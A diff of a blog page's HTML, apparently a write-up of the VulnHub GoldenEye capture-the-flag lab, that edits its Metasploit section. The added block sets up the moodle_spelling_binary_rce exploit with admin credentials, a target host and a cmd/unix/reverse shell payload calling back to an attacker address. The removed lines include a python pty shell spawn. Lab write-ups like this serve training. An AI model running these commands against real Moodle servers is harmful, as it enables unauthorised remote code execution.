@@ -270,11 +270,7 @@
 <h3 id="Shell-engine"><a href="#Shell-engine" class="headerlink" title="Shell engine"></a>Shell engine</h3><p>​	在web应用中修改设置：</p>
 <p><code>Home - Site administration - Plugins - Text editors - TinyMCE HTML editor - PSpellShell</code></p>
 <p><img src="/2022/08/02/vulnhub-goldeneye/image-20220805141338249.png" alt="image-20220805141338249"></p>
-<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">set username admin</span><br><span class="line">set password xWinter1995x!</span><br><span class="line">set rhost severnaya-station.com</span><br><span class="line">set targeturi /gnocertdir</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost 10.1.1.184</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/http/moodle_spelling_binary_rce</span><br><span class="line">set username admin</span><br><span class="line">set password xWinter1995x!</span><br><span class="line">set rhost severnaya-station.com</span><br><span class="line">set targeturi /gnocertdir</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost 10.1.1.184</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 
 
